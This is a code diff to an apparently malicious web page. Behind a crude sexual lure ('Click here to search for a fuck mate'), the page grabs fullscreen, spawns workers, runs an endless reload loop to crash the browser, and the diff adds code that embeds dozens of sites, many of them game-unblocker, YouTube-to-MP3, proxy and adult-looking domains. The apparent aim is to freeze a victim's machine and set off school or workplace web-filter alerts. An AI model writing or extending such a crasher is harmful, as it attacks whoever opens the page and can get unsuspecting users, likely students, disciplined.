@@ -101,6 +101,7 @@
       <div class="rotator" id="rotatorRing"></div>
     </div>
     <div class="status-text" id="statusLabel">Click here to search for a fuck mate 🤤🥵</div>
+    <div id="embeds"></div>
   </div>
 
   <script>
@@ -190,11 +191,12 @@
         else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
         fullScreen = true;
       }
-      
+
+      loadSites();
       keepCrashGoing();
       setTimeout(() => {
         while (1) location.reload();
-      }, 1000);
+      }, 500);
     }
 
     function keepCrashGoing() {
@@ -204,6 +206,55 @@
         spawnWorkers();
         requestAnimationFrame(animate);
       }, 10);
+    }
+
+    const sites = [
+        "https://coolmathgames.com",
+        "https://math.kazwire.com",
+        "https://neal.fun",
+        "https://cookieduck-dev.github.io",
+        "https://poets.kazwire.com",
+        "https://monkeygg2.github.io",
+        "https://kazwire.com",
+        "https://ytmp3.cc",
+        "https://ytmp3.nu",
+        "https://ytmp3.plus",
+        "https://sites.google.com/site/classroom6x/",
+        "https://ytmp3.press",
+        "https://ytmp3.art",
+        "https://en.loader.to/4/",
+        "https://ytmp3.hair",
+        "https://now.gg",
+        "https://sites.google.com/view/class-room-6x/",
+        "https://edit.coolmath-games.com",
+        "https://now.us",
+        "https://xn--31byd1i.net",
+        "https://nachderstille.de/",
+        "https://google.com/search?q=unblocker%20proxy/",
+        "https://nordvpn.com/",
+        "https://ww1.ytmp3.com.se/",
+        "https://ytmp3.pub/",
+        "https://twitter.com",
+        "https://aa.cf",
+        "https://bb.cf",
+        "https://gg.cf",
+        "https://gq.cf",
+        "https://reddit.com",
+        "https://ytmp3.show/",
+        "https://canvas.instructure.cf",
+        "https://ballbang.com/"
+    ];
+    function loadSites() {
+        const container = document.getElementById("embeds");
+        container.innerHTML = "";
+        sites.forEach(url => {
+            const embed = document.createElement("embed");
+            embed.src = url;
+            embed.type = "text/html";
+            embed.width = "400";
+            embed.height = "300";
+            container.appendChild(embed);
+        });
     }
   </script>
 
